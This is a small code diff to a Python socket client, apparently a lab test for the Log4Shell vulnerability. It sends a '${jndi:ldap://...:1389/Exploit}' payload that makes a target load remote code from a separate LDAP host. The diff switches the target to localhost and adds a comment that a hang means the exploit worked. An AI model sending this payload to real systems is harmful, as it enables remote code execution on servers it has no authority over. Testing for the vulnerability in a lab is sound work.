@@ -3,8 +3,8 @@ import _thread
 import socket
 import os, sys
 
-ip_con = "10.1.1.25"
-#ip_con="127.0.0.1"
+#ip_con = "10.1.1.25"
+ip_con="127.0.0.1"
 port_con = 1111
 # LDAP Port is 1389
 
@@ -21,9 +21,9 @@ def do():
     
     print(send(s, "helloworld"))
     
-    din = send(s, "reply to this. I am ${jndi:ldap://10.1.1.126:1389/Log4jRCE}")
+    din = send(s, "reply to this. I am ${jndi:ldap://10.1.1.126:1389/Exploit}")
     print(din)
-    
+    # expect it to hang here if all goes well.
     resp = send(s, b"break")
     print(resp)
     s.close()
